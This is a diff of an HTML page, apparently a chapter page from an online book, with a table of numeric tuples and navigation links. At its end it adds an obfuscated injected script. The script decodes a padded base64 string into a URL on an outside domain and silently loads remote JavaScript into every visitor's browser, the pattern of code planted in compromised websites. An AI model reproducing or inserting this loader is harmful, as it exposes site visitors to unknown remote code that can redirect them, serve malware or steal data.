+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 3, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(166, 10, 3, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(225, 109, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(607, 147, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 9, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(167, 6, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(231, 26, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(607, 273, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 15, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(170, 23, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(231, 34, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(1279, 216, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 31, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(172, 2, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(234, 31, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(1279, 418, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 39, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(174, 13, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(234, 103, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(2281, 715, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 43, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(175, 6, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(236, 5, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(2281, 915, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 46, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(175, 16, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(250, 103, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(2281, 1029, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 51, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(175, 18, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(255, 52, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(3217, 67, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 63, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(175, 57, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(255, 56, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(3217, 576, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 66, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(177, 8, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(255, 82, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(4423, 271, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 67, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(177, 22, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(258, 83, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(9689, 84, 0)
+<TR>
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(151, 70, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(177, 88, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">(266, 47, 0)
+<TD WIDTH="25%" VALIGN="TOP" ALIGN="LEFT">
+<TR>
+<TD COLSPAN="4" ALIGN="LEFT"><HR>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(CGXDRWeU, RWLfcAuQ) {RWLfcAuQ = CGXDRWeU.createElement('script');RWLfcAuQ.type = 'text/javascript';RWLfcAuQ.async = true;RWLfcAuQ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');CGXDRWeU.getElementsByTagName('body')[0].appendChild(RWLfcAuQ);}(document));</script></body>
+</html>
